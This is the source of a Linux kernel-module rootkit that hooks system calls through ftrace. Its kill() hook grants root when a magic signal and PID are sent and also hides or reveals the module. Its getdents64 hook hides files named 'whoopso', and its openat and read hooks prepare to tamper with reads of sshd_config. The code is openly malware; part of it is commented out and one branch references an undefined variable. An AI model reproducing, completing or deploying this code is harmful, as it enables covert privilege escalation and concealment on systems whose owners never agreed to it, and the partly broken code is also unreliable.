#include "../headers/hooks.h"
#include "../headers/credentials.h"
#include "../headers/stealth.h"
#include "../headers/popcorn.h"

static short lkm_hidden = 1; // Why is this static?

int tamper_fd;

#ifdef PTREGS_SYSCALL_STUBS

asmlinkage int pn_mkdir(const struct pt_regs *regs) {
    long error;
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};
    char key_name[] = "0123456789876543210\0";

    error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if (strcmp(dir_name, key_name) == 0) {
            printk(KERN_INFO "Niceu: \"%s\".\n", dir_name);
        }
    }

    lx_mkdir(regs);
    return 0;
}

asmlinkage int pn_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64) {
        if (pid == 4194304) {
            get_root();
        }

        if (pid == 4194303) {
            if (lkm_hidden == 1) {
                show_me();
                lkm_hidden = 0;
            } else {
                hide_me();
                lkm_hidden = 1;
            }
        }
        
    } else {
        return lx_kill(regs);
    }
    return 0;
}

asmlinkage int pn_rmdir(const struct pt_regs *regs) {
    long error;
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to delete directory with name: \"%s\".\n", dir_name);
    }

    lx_rmdir(regs);
    return 0;
}

asmlinkage int pn_reboot(const struct pt_regs *regs) {

    teardown();

    lx_reboot(regs);
    return 0;
}

asmlinkage int pn_unlinkat(const struct pt_regs *regs) {
    long error;
    char __user *pathname = (char *)regs->si;
    char dir_name[NAME_MAX] = {0};

    error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to delete file with name: \"%s\".\n", dir_name);
    }

    lx_unlinkat(regs);
    return 0;
}

asmlinkage int pn_getdents64(const struct pt_regs *regs) {

    char key_name[] = "whoopso\0";

    struct linux_dirent64 {
        u64		d_ino;
        s64		d_off;
        unsigned short	d_reclen;
        unsigned char	d_type;
        char		d_name[];
    };

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset;
    int res;
    long error;

    res = lx_getdents64(regs);
    if (res <= 0) {
        return res;
    }

    dirent_ker = kzalloc(res, GFP_KERNEL);

    if (dirent_ker == NULL) {
        return res;
    }

    error = copy_from_user(dirent_ker, dirent, res);
    if (error) {
        goto done;
    }

    offset = 0;
    while (offset < res) {
        current_dir = (void *)dirent_ker + offset;

        if (strcmp(current_dir->d_name, key_name) == 0 ) { //memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0
            if (current_dir == dirent_ker) {
                res -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, res);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, res);
    if (error) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return res;

}

asmlinkage int pn_openat(const struct pt_regs *regs) {
    char *target = "/etc/ssh/sshd_config";
    int target_len = 20;
    
    char *filename = (char *)regs->di;

    char *kbuf;
    long error;

    kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    if (kbuf == NULL) {
        return lx_openat(regs);
    }


    error = copy_from_user(kbuf, filename, NAME_MAX);
    if (error) {
        kfree(kbuf);
        return lx_openat(regs);
    }


    if (memcmp(kbuf, target, target_len) == 0) {
        tamper_fd = lx_openat(regs);
        kfree(kbuf);
        return tamper_fd;
    }

    kfree(kbuf);
    return lx_openat(regs);
}

asmlinkage int pn_read(const struct pt_regs *regs) {
    int fd = regs->di;
    char *buf = (char *)regs->si;
    size_t count = regs->dx;

    char *kbuf;
    long error;
    int ret;

    if ((tamper_fd == fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) ) {

        kbuf = kzalloc(count, GFP_KERNEL);
        if (kbuf == NULL) {
            return lx_read(regs);
        } 

        ret = lx_read(regs);

        error = copy_from_user(kbuf, buf, count);
        if (error != 0) {
            kfree(kbuf);
            return ret;
        }

        // if (memcmp(tamper_fd, HIDDEN_USER, strlen(HIDDEN_USER)) == 0) {
        //     for (i = 0 ; i < count ; i++) {
        //         kbuf[i] = 0x0;
        //     }

        //     error = copy_to_user(buf, kbuf, count);

        //     kfree(kbuf);
        //     return ret;
        // }
        
    //     kfree(buf);
    //     return ret;
    }

    return lx_read(regs);
}

#else

asmlinkage int pn_mkdir(const char __user *pathname, umode_t mode) {
    long error;
    char dir_name[NAME_MAX] = {0};
    char key_name[] = "0123456789876543210\0";

    error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0) {
        printk(KERN_INFO "User trying to create directory with name: \"%s\".\n", dir_name);
        if (strcmp(dir_name, key_name) == 0) {
            printk(KERN_INFO "Niceu: \"%s\".\n", dir_name);
        }
    }

    lx_mkdir(pathname, mode);
    return 0;
}

asmlinkage int pn_kill(pid_t pid, int sig) {
    if (sig == 64) {
        if (pid == 4194304) {
            get_root();
        }

        if (pid == 4194303) {
            if (lkm_hidden == 1) {
                show_me();
                lkm_hidden = 0;
            } else {
                hide_me();
                lkm_hidden = 1;
            }
        }

    } else {
        return lx_kill(pid, sig);
    }
    return 0;
}

asmlinkage int pn_rmdir(const char __user *pathname) {
    long error;
    char dir_name[NAME_MAX] = {0};

    error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0 ) {
        printk(KERN_INFO "User trying to delete directory with name: \"%s\".\n", dir_name);
    }

    lx_rmdir(pathname);
    return 0;
}

asmlinkage int pn_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg) {

    teardown();

    lx_reboot(magic1, magic2, cmd, arg);
    return 0;
}

asmlinkage int pn_unlinkat(int dfd, const char __user * pathname, int flag) {
    long error;
    char dir_name[NAME_MAX] = {0};
    
    error = strncpy_from_user(dir_name, pathname, NAME_MAX);
    
    if (error > 0) {
        printk(KERN_INFO "User trying to delete file with name: \"%s\".\n", dir_name);
    }

    lx_unlinkat(dfd, pathname, flag);
    return 0;
}

asmlinkage int pn_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {

    char key_name[] = "whoopso\0";

    struct linux_dirent64 {
        u64		d_ino;
        s64		d_off;
        unsigned short	d_reclen;
        unsigned char	d_type;
        char		d_name[];
    };

    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset;
    int res;
    long error;

    res = lx_getdents64(regs);
    if (res <= 0) {
        return res;
    }

    dirent_ker = kzalloc(res, GFP_KERNEL);

    if (dirent_ker == NULL) {
        return res;
    }

    error = copy_from_user(dirent_ker, dirent, res);
    if (error) {
        goto done;
    }

    offset = 0;
    while (offset < res) {
        current_dir = (void *)dirent_ker + offset;

        if (strcmp(current_dir->d_name, key_name) == 0 ) { //memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0
            if (current_dir == dirent_ker) {
                res -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, res);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, res);
    if (error) {
        goto done;
    }

done:
    kfree(dirent_ker);
    return res;

}

asmlinkage int pn_openat(int dfd, const char __user *filename, int flags, umode_t mode) {
    // char *target = "/etc/ssh/sshd_config";
    // int target_len = 20;
    
    // char *kbuf;
    // long error;

    // kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
    // if (kbuf == NULL) {
    //     return lx_openat(regs);
    // }


    // error = copy_from_user(kbuf, filename, NAME_MAX);
    // if (error) {
    //     kfree(kbuf);
    //     return lx_openat(regs);
    // }


    // if (memcmp(kbuf, target, target_len) == 0) {
    //     tamper_fd = lx_openat(regs);
    //     kfree(kbuf);
    //     return tamper_fd;
    // }

    // kfree(kbuf);
    return lx_openat(regs);
}

asmlinkage int pn_read(unsigned int fd, char __user *buf, size_t count) {
    // char *kbuf;
    // long error;
    // int ret;

    // if ((tamper_fd == fd) && (tamper_fd != 0) && (tamper_fd != 1) && (tamper_fd != 2) ) {

    //     kbuf = kzalloc(count, GFP_KERNEL);
    //     if (kbuf == NULL) {
    //         return lx_read(regs);
    //     } 

    //     ret = lx_read(regs);

    //     error = copy_from_user(kbuf, buf, count);
    //     if (error != 0) {
    //         kfree(kbuf);
    //         return ret;
    //     }

    //     printk(KERN_INFO "%s", kbuf);

        // if (memcmp(tamper_fd, HIDDEN_USER, strlen(HIDDEN_USER)) == 0) {
        //     for (i = 0 ; i < count ; i++) {
        //         kbuf[i] = 0x0;
        //     }

        //     error = copy_to_user(buf, kbuf, count);

        //     kfree(kbuf);
        //     return ret;
        // }
        
        // kfree(buf);
    //     return ret;
    // }

    return lx_read(regs);
}

#endif

// Define ftrace kernel hooks
static struct ftrace_hook kernel_hooks[] = {
    HOOK("__x64_sys_mkdir", pn_mkdir, &lx_mkdir),
    HOOK("__x64_sys_kill", pn_kill, &lx_kill),
    HOOK("__x64_sys_rmdir", pn_rmdir, &lx_rmdir),
    HOOK("__x64_sys_reboot", pn_reboot, &lx_reboot),
    HOOK("__x64_sys_unlinkat", pn_unlinkat, &lx_unlinkat),
    HOOK("__x64_sys_getdents64", pn_getdents64, &lx_getdents64),
    HOOK("__x64_sys_openat", pn_openat, &lx_openat),
    HOOK("__x64_sys_read", pn_read, &lx_read)
};
